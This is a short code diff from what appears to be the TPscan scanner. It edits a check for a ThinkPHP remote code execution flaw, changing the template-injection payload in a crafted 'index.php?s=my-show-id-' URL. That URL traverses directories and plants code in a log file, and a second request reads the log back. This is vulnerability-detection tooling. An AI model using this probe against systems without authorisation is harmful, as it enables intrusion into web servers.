@@ -20,7 +20,7 @@ def thinkphp_index_showid_rce_verify(url):
         "User-Agent" : 'TPscan',
     }
     try:
-        vurl = urllib.parse.urljoin(url, 'index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~print_r(md5(2333))}]')
+        vurl = urllib.parse.urljoin(url, 'index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]')
         req = requests.get(vurl, headers=headers, timeout=15, verify=False)
         timenow = datetime.datetime.now().strftime("%Y_%m_%d")[2:]
         vurl2 = urllib.parse.urljoin(url, 'index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C{0}.log'.format(timenow))
